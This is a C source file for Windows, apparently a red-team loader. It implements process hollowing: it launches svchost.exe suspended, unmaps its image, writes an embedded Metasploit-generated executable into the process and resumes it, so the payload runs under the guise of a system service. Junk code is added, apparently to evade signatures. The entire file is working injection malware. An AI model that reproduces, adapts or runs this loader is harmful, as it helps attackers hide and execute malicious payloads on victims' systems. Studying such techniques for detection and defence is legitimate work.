// Modified version of: https://github.com/idan1288/ProcessHollowing32-64/blob/master/ProcessHollowing/ProcessHollowing.c
// Reference: https://ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations
// Reference: https://gist.github.com/smgorelik/9a80565d44178771abf1e4da4e2a0e75
// Reference: https://www.andreafortuna.org/2017/11/22/runpe-a-practical-example-of-process-hollowing-technique/
// 
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include "MSFPayload.h"

#pragma comment(lib,"ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);

int junk_function(int x, int y)
{
	x + y;
	x* y;
	x^ y;

	return 3200;
}
int wmain(int argc, wchar_t* argv[])
{
	char* junk_data = "cache money crew";
	junk_function(100, 200);

	PIMAGE_DOS_HEADER pDosH;
	PIMAGE_NT_HEADERS pNtH;
	PIMAGE_SECTION_HEADER pSecH;

	PVOID image;
	PVOID mem;
	PVOID base;
	DWORD i;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	PROCESS_BASIC_INFORMATION pbi;

	CONTEXT ctx;

	ctx.ContextFlags = CONTEXT_FULL;

	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));

	
	LPSTR tgt_process = "C:\\Windows\\system32\\svchost.exe";
	printf("[---> Process Hollow  <---]\n");
	printf("[*] Running the target executable (%s)\n", tgt_process);

	if (!CreateProcess(TEXT(tgt_process),"-k netsrv", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) // Start the target application
	{
		printf("[!] Error: Unable to run the target executable. CreateProcess failed with error %d\n", GetLastError());
		return 1;
	}
	printf("[*] Process created in suspended state (%s PID: %d)\n", tgt_process, pi.dwProcessId);

	// get destination imageBase offset address from the PEB
	DWORD returnLenght = 0;

	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLenght);
	DWORD pebImageBaseOffset = (DWORD)pbi.PebBaseAddress + 8;

	// get destination imageBaseAddress
	LPVOID destImageBase = 0;
	SIZE_T bytesRead = NULL;
	ReadProcessMemory(pi.hProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, &bytesRead);
	NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, destImageBase);
	if (status != NULL) {
		printf("[*] Memory unmapped from child process!");
	}


	pDosH = (PIMAGE_DOS_HEADER)msf_executable;

	if (pDosH->e_magic != IMAGE_DOS_SIGNATURE) // Check for valid executable
	{
		// something is wrong with your msf_execuable bytes you copied.
		printf("[!] Error: Invalid executable format.");
		NtTerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
		return 1;
	}

	pNtH = (PIMAGE_NT_HEADERS)((LPBYTE)msf_executable + pDosH->e_lfanew); // Get the address of the IMAGE_NT_HEADERS
	NtGetContextThread(pi.hThread, &ctx); // Get the thread context of the child process's primary thread

#ifdef _WIN64
	NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &base, sizeof(PVOID), NULL); // Get the PEB address from the ebx register and read the base address of the executable image from the PEB
#endif

#ifdef _X86_
	NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &base, sizeof(PVOID), NULL); // Get the PEB address from the ebx register and read the base address of the executable image from the PEB
#endif
	printf("\n[*] Allocating RWX memory in child process.\n");
	mem = VirtualAllocEx(pi.hProcess, (PVOID)pNtH->OptionalHeader.ImageBase, pNtH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Allocate memory for the executable image

	if (!mem)
	{
		printf("[!] Error: Unable to allocate memory in child process. VirtualAllocEx failed with error %d\n", GetLastError());

		NtTerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
		return 1;
	}

	printf("[*] Memory allocated. Address: %#zx\n", (SIZE_T)mem);
	printf("[*] Writing executable image into child process.\n");

	NtWriteVirtualMemory(pi.hProcess, mem, msf_executable, pNtH->OptionalHeader.SizeOfHeaders, NULL); // Write the header of the replacement executable into child process

	for (i = 0; i<pNtH->FileHeader.NumberOfSections; i++) {
		pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)msf_executable + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		NtWriteVirtualMemory(pi.hProcess, (PVOID)((LPBYTE)mem + pSecH->VirtualAddress), (PVOID)((LPBYTE)msf_executable + pSecH->PointerToRawData), pSecH->SizeOfRawData, NULL); // Write the remaining sections of the replacement executable into child process
	}


#ifdef _WIN64
	ctx.Rcx = (SIZE_T)((LPBYTE)mem + pNtH->OptionalHeader.AddressOfEntryPoint); // Set the eax register to the entry point of the injected image

	printf("[*] New entry point: %#zx\n", ctx.Rcx);

	NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T)*2)), &pNtH->OptionalHeader.ImageBase, sizeof(PVOID), NULL); // Write the base address of the injected image into the PEB
#endif

#ifdef _X86_
	ctx.Eax = (SIZE_T)((LPBYTE)mem + pNtH->OptionalHeader.AddressOfEntryPoint); // Set the eax register to the entry point of the injected image

	printf("\nNew entry point: %#zx\n", ctx.Eax);

	NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &pNtH->OptionalHeader.ImageBase, sizeof(PVOID), NULL); // Write the base address of the injected image into the PEB
#endif
	
	printf("[*] Setting the context of the child process's primary thread.\n");
	NtSetContextThread(pi.hThread, &ctx); // Set the thread context of the child process's primary thread

	printf("[*] Resuming child process's primary thread.\n");
	NtResumeThread(pi.hThread, NULL); // Resume the primary thread

	printf("[*] Thread resumed.\n");


	NtClose(pi.hThread); // Close the thread handle
	NtClose(pi.hProcess); // Close the process handle

	return 0;
}